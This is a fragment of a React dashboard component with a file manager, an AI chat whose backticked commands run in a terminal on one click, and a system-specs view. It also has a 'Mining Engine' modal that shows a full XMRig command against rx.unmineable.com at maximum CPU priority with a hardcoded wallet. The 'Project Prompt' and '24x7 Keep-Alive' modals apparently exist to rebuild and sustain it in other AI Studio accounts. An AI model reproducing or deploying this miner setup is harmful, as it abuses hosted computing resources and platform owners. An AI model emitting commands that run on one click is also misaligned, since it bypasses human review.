                          isLast ? "text-zinc-200 font-bold" : "text-zinc-400"
                        }`}
                      >
                        {segment}
                      </button>
                    </span>
                  );
                })}
              </div>
            </div>

            {/* Right: Search & Actions */}
            <div className="flex items-center gap-2 shrink-0">
              {/* Search Bar */}
              <div className="relative">
                <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
                <input
                  id="input-file-search"
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Filter files..."
                  className="bg-black/50 border border-zinc-800 rounded-lg pl-8 pr-6 py-1 text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-sky-500 w-32 sm:w-44 transition-all"
                />
                {searchQuery && (
                  <button
                    onClick={() => setSearchQuery("")}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-zinc-500 hover:text-zinc-300"
                  >
                    <X className="w-3 h-3" />
                  </button>
                )}
              </div>

              {/* Action Buttons */}
              <button
                id="btn-new-file"
                onClick={() => setIsCreatingItem(true)}
                className="px-2.5 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shadow-sm active:scale-95"
                title="Create a new file or directory"
              >
                <Plus className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">New File</span>
              </button>

              <button
                id="btn-refresh-files"
                onClick={() => fetchFiles(currentPath)}
                className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-400 hover:text-white transition-colors border border-zinc-800"
                title="Refresh file list"
              >
                <RefreshCw className={`w-4 h-4 ${isLoadingFiles ? "animate-spin text-emerald-400" : ""}`} />
              </button>
            </div>
          </div>

          {/* Subheader: Folder stats */}
          <div className="px-4 py-1.5 bg-zinc-950 border-b border-zinc-800/60 flex items-center justify-between text-[11px] font-mono text-zinc-500 shrink-0">
            <div className="flex items-center gap-3">
              <span>
                {files.filter((f) => f.isDirectory).length} folders,{" "}
                {files.filter((f) => !f.isDirectory).length} files
              </span>
              {searchQuery && (
                <span className="text-sky-400">
                  (Showing {files.filter((f) => f.name.toLowerCase().includes(searchQuery.toLowerCase())).length} matches)
                </span>
              )}
            </div>
            <div className="flex items-center gap-2 text-zinc-400">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
              <span>Click any file to edit & save permanently</span>
            </div>
          </div>

          {/* File Grid / List */}
          <div className="flex-1 overflow-y-auto p-3 sm:p-4">
            {isLoadingFiles ? (
              <div className="h-full flex flex-col items-center justify-center gap-3">
                <RefreshCw className="w-8 h-8 animate-spin text-emerald-500" />
                <span className="text-xs font-mono text-zinc-500">Loading filesystem...</span>
              </div>
            ) : files.length === 0 ? (
              <div className="h-64 flex flex-col items-center justify-center text-center p-6 border border-dashed border-zinc-800 rounded-2xl">
                <Folder className="w-10 h-10 text-zinc-700 mb-3" />
                <p className="text-sm font-semibold text-zinc-300">This directory is empty</p>
                <p className="text-xs text-zinc-500 mt-1 mb-4">Create your first file to get started</p>
                <button
                  onClick={() => setIsCreatingItem(true)}
                  className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold rounded-xl flex items-center gap-1.5 transition-all shadow-md"
                >
                  <Plus className="w-4 h-4" />
                  <span>Create File</span>
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2.5">
                {files
                  .filter((file) => file.name.toLowerCase().includes(searchQuery.toLowerCase()))
                  .map((file) => {
                    const ext = file.name.split(".").pop()?.toLowerCase();
                    const isCode = ["ts", "tsx", "js", "jsx", "json", "py", "sh", "html", "css", "md", "env"].includes(
                      ext || ""
                    );

                    return (
                      <div
                        key={file.path}
                        id={`file-card-${file.name}`}
                        className="group relative flex flex-col justify-between p-3 bg-zinc-900/40 hover:bg-zinc-850 border border-zinc-800/70 hover:border-zinc-700 rounded-xl transition-all shadow-sm hover:shadow-md"
                      >
                        {/* Top: Icon + Name */}
                        <div
                          onClick={() => (file.isDirectory ? navigateTo(file.path) : openFileForEdit(file))}
                          className="flex items-start gap-3 cursor-pointer select-none"
                        >
                          <div className="p-2 rounded-lg bg-zinc-950/70 border border-zinc-800/80 shrink-0 mt-0.5 group-hover:border-zinc-700 transition-colors">
                            {file.isDirectory ? (
                              <Folder className="w-5 h-5 text-amber-400" />
                            ) : isCode ? (
                              <FileCode className="w-5 h-5 text-emerald-400" />
                            ) : (
                              <File className="w-5 h-5 text-sky-400" />
                            )}
                          </div>

                          <div className="min-w-0 flex-1">
                            <p className="text-xs font-medium font-mono text-zinc-200 group-hover:text-white truncate" title={file.name}>
                              {file.name}
                            </p>
                            <div className="flex items-center gap-2 mt-1">
                              <span className="text-[10px] font-mono text-zinc-500">
                                {file.isDirectory
                                  ? "Directory"
                                  : file.size < 1024
                                  ? `${file.size} B`
                                  : file.size < 1024 * 1024
                                  ? `${(file.size / 1024).toFixed(1)} KB`
                                  : `${(file.size / (1024 * 1024)).toFixed(2)} MB`}
                              </span>
                              {!file.isDirectory && ext && (
                                <span className="px-1 py-0.2 bg-zinc-800/80 text-zinc-400 text-[9px] font-mono rounded">
                                  {ext}
                                </span>
                              )}
                            </div>
                          </div>
                        </div>

                        {/* Bottom: Quick Actions Bar */}
                        <div className="mt-3 pt-2.5 border-t border-zinc-800/50 flex items-center justify-between">
                          {!file.isDirectory ? (
                            <button
                              onClick={() => openFileForEdit(file)}
                              className="px-2 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 text-[11px] font-medium rounded-lg transition-colors flex items-center gap-1 border border-emerald-500/20"
                            >
                              <FileCode className="w-3 h-3" />
                              <span>Edit File</span>
                            </button>
                          ) : (
                            <button
                              onClick={() => navigateTo(file.path)}
                              className="px-2 py-1 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 text-[11px] font-medium rounded-lg transition-colors flex items-center gap-1 border border-amber-500/20"
                            >
                              <Folder className="w-3 h-3" />
                              <span>Open</span>
                            </button>
                          )}

                          <div className="flex items-center gap-1 opacity-80 group-hover:opacity-100 transition-opacity">
                            <button
                              onClick={() => setRenamingItem(file)}
                              className="p-1 text-zinc-400 hover:text-sky-300 hover:bg-zinc-800 rounded transition-colors"
                              title="Rename"
                            >
                              <Edit3 className="w-3.5 h-3.5" />
                            </button>
                            <button
                              onClick={() => setDeletingItem(file)}
                              className="p-1 text-zinc-400 hover:text-rose-400 hover:bg-zinc-800 rounded transition-colors"
                              title="Delete"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        </div>

        {/* AI Assistant Tab */}
        <div className={`h-full w-full flex flex-col bg-zinc-950 ${activeTab === "ai" ? "block" : "hidden"}`}>
          <div className="flex-1 overflow-y-auto p-4 space-y-4">
            {messages.map((m, i) => (
              <div key={i} className={`flex ${m.role === "user" ? "justify-end" : "justify-start"}`}>
                <div className={`max-w-[85%] p-3 rounded-2xl ${m.role === "user" ? "bg-sky-600 text-white" : "bg-zinc-900 border border-zinc-800 text-zinc-200"}`}>
                  <div className="flex items-center gap-2 mb-1">
                    {m.role === "assistant" ? <Bot className="w-3 h-3 text-emerald-400" /> : null}
                    <span className="text-[10px] uppercase tracking-widest font-bold opacity-50">
                      {m.role === "user" ? "You" : "AI Assistant"}
                    </span>
                  </div>
                  <div className="text-sm leading-relaxed whitespace-pre-wrap">
                    {m.content.split(/(`[^`]+`)/g).map((part, idx) => {
                      if (part.startsWith("`") && part.endsWith("`")) {
                        const cmd = part.slice(1, -1);
                        return (
                          <span key={idx} className="inline-flex items-center gap-1.5 px-1.5 py-0.5 bg-black/50 rounded font-mono text-emerald-400 border border-zinc-700 group relative">
                            {cmd}
                            <button 
                              onClick={() => runCommand(cmd)}
                              className="p-1 hover:bg-zinc-700 rounded transition-colors"
                              title="Run in Terminal"
                            >
                              <Play className="w-2.5 h-2.5" />
                            </button>
                          </span>
                        );
                      }
                      return part;
                    })}
                  </div>
                </div>
              </div>
            ))}
            {isTyping && (
              <div className="flex justify-start">
                <div className="bg-zinc-900 border border-zinc-800 p-3 rounded-2xl flex gap-1">
                  <div className="w-1.5 h-1.5 bg-zinc-600 rounded-full animate-bounce" />
                  <div className="w-1.5 h-1.5 bg-zinc-600 rounded-full animate-bounce [animation-delay:0.2s]" />
                  <div className="w-1.5 h-1.5 bg-zinc-600 rounded-full animate-bounce [animation-delay:0.4s]" />
                </div>
              </div>
            )}
            <div ref={chatEndRef} />
          </div>

          <div className="p-4 bg-zinc-900 border-t border-zinc-800">
            <div className="flex gap-2 max-w-4xl mx-auto">
              <input
                type="text"
                value={input}
                onChange={(e) => setInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleSendMessage()}
                placeholder="Ask AI for help..."
                className="flex-1 bg-black border border-zinc-800 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-sky-500 transition-colors"
              />
              <button
                onClick={handleSendMessage}
                disabled={isTyping}
                className="p-2 bg-sky-600 hover:bg-sky-500 disabled:opacity-50 rounded-xl transition-colors"
              >
                <Send className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Live File Editor Modal (Permanent Disk Changes) */}
      <AnimatePresence>
        {editingFile !== null && (
          <FileEditorModal
            filePath={editingFile.path}
            fileName={editingFile.name}
            initialContent={editingFile.content}
            onClose={() => setEditingFile(null)}
            onSaved={handleFileSaved}
          />
        )}
      </AnimatePresence>

      {/* Create New File / Folder Modal */}
      <AnimatePresence>
        {isCreatingItem && (
          <CreateItemModal
            currentPath={currentPath}
            onClose={() => setIsCreatingItem(false)}
            onCreated={handleItemCreated}
          />
        )}
      </AnimatePresence>

      {/* Delete Item Confirmation Modal */}
      <AnimatePresence>
        {deletingItem !== null && (
          <DeleteConfirmModal
            item={deletingItem}
            onClose={() => setDeletingItem(null)}
            onDeleted={handleItemDeleted}
          />
        )}
      </AnimatePresence>

      {/* Rename Item Modal */}
      <AnimatePresence>
        {renamingItem !== null && (
          <RenameModal
            item={renamingItem}
            onClose={() => setRenamingItem(null)}
            onRenamed={handleItemRenamed}
          />
        )}
      </AnimatePresence>

      {/* Floating Toast Notification */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: 20, scale: 0.9 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 20, scale: 0.9 }}
            className="fixed bottom-6 right-6 z-50 bg-zinc-900 border border-zinc-700 text-zinc-100 px-4 py-2.5 rounded-xl shadow-2xl flex items-center gap-2.5 text-xs font-mono"
          >
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>{toastMessage}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* System Specs Modal */}
      <AnimatePresence>
        {showSpecs && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-2xl w-full max-w-2xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden"
            >
              <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/50">
                <div className="flex items-center gap-3">
                  <Cpu className="w-5 h-5 text-sky-400" />
                  <h2 className="text-sm font-bold uppercase tracking-[0.2em]">System Information</h2>
                </div>
                <button onClick={() => setShowSpecs(false)} className="p-2 hover:bg-zinc-800 rounded-full text-zinc-500 hover:text-white transition-colors">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto p-6 space-y-8">
                {isLoadingSpecs ? (
                  <div className="h-40 flex flex-col items-center justify-center gap-4">
                    <RefreshCw className="w-8 h-8 animate-spin text-sky-500" />
                    <p className="text-[10px] uppercase tracking-widest text-zinc-500">Gathering system data...</p>
                  </div>
                ) : specsError ? (
                  <div className="h-40 flex flex-col items-center justify-center gap-4 text-center">
                    <X className="w-8 h-8 text-rose-500" />
                    <p className="text-sm text-rose-400 font-mono">{specsError}</p>
                  </div>
                ) : specs && (
                  <>
                    <section>
                      <div className="flex items-center gap-2 mb-4">
                        <Activity className="w-4 h-4 text-emerald-500" />
                        <h3 className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Operating System</h3>
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        {[
                          { label: "Platform", value: specs.os.platform },
                          { label: "Release", value: specs.os.release },
                          { label: "Arch", value: specs.os.arch },
                          { label: "Hostname", value: specs.os.hostname },
                          { label: "Uptime", value: specs.os.uptime },
                          { label: "Shell", value: specs.shell },
                        ].map((item) => (
                          <div key={item.label} className="bg-black/30 p-3 rounded-lg border border-zinc-800/50">
                            <p className="text-[9px] uppercase tracking-wider text-zinc-600 mb-1">{item.label}</p>
                            <p className="text-xs font-mono text-zinc-300">{item.value}</p>
                          </div>
                        ))}
                      </div>
                    </section>

                    <section>
                      <div className="flex items-center gap-2 mb-4">
                        <Cpu className="w-4 h-4 text-amber-500" />
                        <h3 className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Processor & Memory</h3>
                      </div>
                      <div className="space-y-4">
                        <div className="bg-black/30 p-4 rounded-lg border border-zinc-800/50">
                          <p className="text-[9px] uppercase tracking-wider text-zinc-600 mb-1">CPU Model</p>
                          <p className="text-xs font-mono text-zinc-300">{specs.cpu.model}</p>
                        </div>
                        <div className="grid grid-cols-3 gap-4">
                          {[
                            { label: "Total RAM", value: specs.memory.total },
                            { label: "Used RAM", value: specs.memory.used },
                            { label: "Free RAM", value: specs.memory.free },
                          ].map((item) => (
                            <div key={item.label} className="bg-black/30 p-3 rounded-lg border border-zinc-800/50 text-center">
                              <p className="text-[9px] uppercase tracking-wider text-zinc-600 mb-1">{item.label}</p>
                              <p className="text-xs font-mono text-zinc-300">{item.value}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    </section>

                    <section>
                      <div className="flex items-center gap-2 mb-4">
                        <HardDrive className="w-4 h-4 text-sky-500" />
                        <h3 className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Storage Usage</h3>
                      </div>
                      <div className="bg-black/30 p-4 rounded-lg border border-zinc-800/50">
                        <pre className="text-[10px] font-mono text-zinc-400 overflow-x-auto">
                          {specs.storage}
                        </pre>
                      </div>
                    </section>
                  </>
                )}
              </div>
              
              <div className="px-6 py-4 bg-zinc-950 border-t border-zinc-800 flex justify-end">
                <button
                  onClick={() => setShowSpecs(false)}
                  className="px-6 py-2 bg-white text-black text-[10px] font-bold uppercase tracking-widest rounded-lg hover:bg-zinc-200 transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Mining Logs Modal */}
      <AnimatePresence>
        {showMiningLogs && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-2xl w-full max-w-4xl h-[85vh] flex flex-col shadow-2xl overflow-hidden"
            >
              <div className="px-5 py-3.5 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/80">
                <div className="flex items-center gap-3">
                  <Activity className="w-5 h-5 text-emerald-400" />
                  <div>
                    <h2 className="text-xs font-bold uppercase tracking-[0.2em] font-mono text-zinc-100">
                      Mining Engine & Live Output
                    </h2>
                    <span className="text-[10px] text-amber-400 font-mono flex items-center gap-1">
                      <Zap className="w-3 h-3 fill-amber-400 inline" /> Mode: 100% MAXIMUM TURBO (Priority 5, All Cores)
                    </span>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <button 
                    onClick={boostToMaxPower}
                    disabled={isBoostingPower}
                    className="px-2.5 py-1.5 bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 rounded-lg text-[10px] font-mono font-bold flex items-center gap-1 transition-all"
                    title="Force 100% Max Power"
                  >
                    <Zap className="w-3 h-3 fill-amber-400" />
                    <span>Turbo 100%</span>
                  </button>
                  <button 
                    onClick={fetchMiningLogs} 
                    className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-400 hover:text-white transition-colors border border-zinc-800"
                    title="Refresh Logs"
                  >
                    <RefreshCw className={`w-4 h-4 ${isFetchingLogs ? "animate-spin text-emerald-400" : ""}`} />
                  </button>
                  <button onClick={() => setShowMiningLogs(false)} className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-400 hover:text-white transition-colors border border-zinc-800">
                    <X className="w-4 h-4" />
                  </button>
                </div>
              </div>

              <div className="flex-1 overflow-auto bg-black/70 p-4 space-y-3">
                <div className="p-3 bg-zinc-950/80 border border-zinc-800 rounded-xl space-y-1.5 font-mono text-xs">
                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-zinc-800 pb-2">
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] uppercase tracking-widest text-zinc-500">Engine:</span>
                      <span className="text-emerald-400 font-bold">XMRig Optimized (Full CPU Allocation)</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] uppercase tracking-widest text-zinc-500">Flags:</span>
                      <span className="text-sky-400 text-[10px]">--cpu-priority=5 --cpu-no-yield --threads=100%</span>
                    </div>
                  </div>
                  <div className="flex items-center justify-between text-[11px] text-zinc-400 pt-1">
                    <span>Active Cores: <strong className="text-zinc-200">{miningStatus?.threads || "All Available"} Cores</strong></span>
                    <span>Status: <strong className="text-emerald-400">⚡ Continuous Full-Power Mining</strong></span>
                  </div>
                  <div className="border-t border-zinc-800/80 pt-2 grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-zinc-400">
                    <div>
                      <span className="text-zinc-500 text-[10px] uppercase tracking-wider block">Coin / Network:</span>
                      <span className="text-amber-400 font-bold flex items-center gap-1.5">
                        <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block animate-pulse"></span>
                        {miningStatus?.coin || "USDT"} ({miningStatus?.network || "BEP20"})
                      </span>
                    </div>
                    <div>
                      <span className="text-zinc-500 text-[10px] uppercase tracking-wider block">Wallet Address:</span>
                      <span className="text-zinc-200 font-mono text-[10px] break-all select-all">
                        {miningStatus?.address || "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8"}
                      </span>
                    </div>
                  </div>

                  <div className="border-t border-zinc-800/80 pt-2 space-y-1.5">
                    <div className="flex items-center justify-between">
                      <span className="text-zinc-500 text-[10px] uppercase tracking-wider">Last Executed Command:</span>
                      <button
                        onClick={() => {
                          const cmd = miningStatus?.lastCommand || `./xmrig -o rx.unmineable.com:3333 -a rx/0 -k -u USDT:0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8.Worker -t ${miningStatus?.threads || 2} --cpu-priority=5`;
                          navigator.clipboard.writeText(cmd);
                          showToast("Command copied!");
                        }}
                        className="text-[10px] text-sky-400 hover:text-sky-300 flex items-center gap-1 font-mono"
                      >
                        <Copy className="w-3 h-3" />
                        <span>Copy Command</span>
                      </button>
                    </div>
                    <pre className="p-2 bg-black/80 border border-zinc-800 rounded text-[10px] text-emerald-400 font-mono whitespace-pre-wrap break-all select-all">
                      {miningStatus?.lastCommand || `./xmrig -o rx.unmineable.com:3333 -a rx/0 -k -u USDT:0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8.Worker -t 2 --cpu-priority=5`}
                    </pre>
                  </div>
                </div>

                <div className="bg-black/90 border border-zinc-800/80 rounded-xl p-4 min-h-[300px]">
                  {isFetchingLogs && !miningLogsContent ? (
                    <div className="h-40 flex items-center justify-center flex-col gap-2 text-zinc-500">
                      <RefreshCw className="w-6 h-6 animate-spin text-emerald-500" />
                      <span className="text-xs font-mono">Fetching latest mining logs...</span>
                    </div>
                  ) : (
                    <pre className="text-[11px] font-mono text-zinc-300 whitespace-pre-wrap leading-relaxed overflow-x-auto">
                      {miningLogsContent || "Starting engine logs... Refresh in a few seconds."}
                    </pre>
                  )}
                </div>
              </div>
              
              <div className="px-5 py-3 bg-zinc-950 border-t border-zinc-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      if (miningLogsContent) {
                        navigator.clipboard.writeText(miningLogsContent);
                        showToast("Mining logs copied to clipboard!");
                      }
                    }}
                    className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-[11px] font-mono rounded-lg transition-colors flex items-center gap-1.5"
                  >
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy Logs</span>
                  </button>
                  <button
                    onClick={async () => {
                      await fetch("/api/mining/logs/clear", { method: "POST" });
                      setMiningLogsContent("[LOG CLEARED] Fresh continuous logs starting...");
                      showToast("Log history cleared!");
                    }}
                    className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-[11px] font-mono rounded-lg transition-colors flex items-center gap-1.5"
                    title="Clear old repeated log entries"
                  >
                    <Trash2 className="w-3.5 h-3.5 text-zinc-400" />
                    <span>Clear Logs</span>
                  </button>
                  <button
                    onClick={stopMiningProcess}
                    className="px-3 py-1.5 bg-rose-950/40 hover:bg-rose-900/60 text-rose-400 border border-rose-800/50 text-[11px] font-mono rounded-lg transition-colors flex items-center gap-1.5"
                  >
                    <Power className="w-3.5 h-3.5" />
                    <span>Stop Engine</span>
                  </button>
                </div>

                <button
                  onClick={() => setShowMiningLogs(false)}
                  className="px-5 py-1.5 bg-white text-black text-[11px] font-bold uppercase tracking-wider font-mono rounded-lg hover:bg-zinc-200 transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Project Prompt Modal */}
      <AnimatePresence>
        {showPrompt && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-2xl w-full max-w-2xl flex flex-col shadow-2xl overflow-hidden"
            >
              <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/50">
                <div className="flex items-center gap-3">
                  <Sparkles className="w-5 h-5 text-purple-400" />
                  <h2 className="text-sm font-bold uppercase tracking-[0.2em]">Project Prompt</h2>
                </div>
                <button onClick={() => setShowPrompt(false)} className="p-2 hover:bg-zinc-800 rounded-full text-zinc-500 hover:text-white transition-colors">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="p-6 space-y-4">
                <p className="text-xs text-zinc-400 leading-relaxed">
                  Use this prompt in AI Studio to recreate this exact project in another account.
                </p>
                <div className="relative group">
                  <div className="absolute top-3 right-3 opacity-0 group-hover:opacity-100 transition-opacity">
                    <button
                      onClick={copyToClipboard}
                      className="p-2 bg-zinc-800 hover:bg-zinc-700 rounded-lg border border-zinc-700 text-zinc-300 transition-all flex items-center gap-2"
                    >
                      {copied ? <Check className="w-3 h-3 text-emerald-500" /> : <Copy className="w-3 h-3" />}
                      <span className="text-[10px] uppercase font-bold">{copied ? "Copied" : "Copy"}</span>
                    </button>
                  </div>
                  <div className="bg-black/50 border border-zinc-800 rounded-xl p-5 font-mono text-[11px] text-zinc-300 leading-relaxed whitespace-pre-wrap max-h-[40vh] overflow-y-auto">
                    {PROJECT_PROMPT}
                  </div>
                </div>
              </div>
              
              <div className="px-6 py-4 bg-zinc-950 border-t border-zinc-800 flex justify-end">
                <button
                  onClick={() => setShowPrompt(false)}
                  className="px-6 py-2 bg-white text-black text-[10px] font-bold uppercase tracking-widest rounded-lg hover:bg-zinc-200 transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* 24x7 Keep-Alive Modal */}
      <AnimatePresence>
        {showKeepAlive && (
          <KeepAliveModal
            onClose={() => setShowKeepAlive(false)}
            onToast={showToast}
          />
        )}
      </AnimatePresence>
    </div>
  );
}

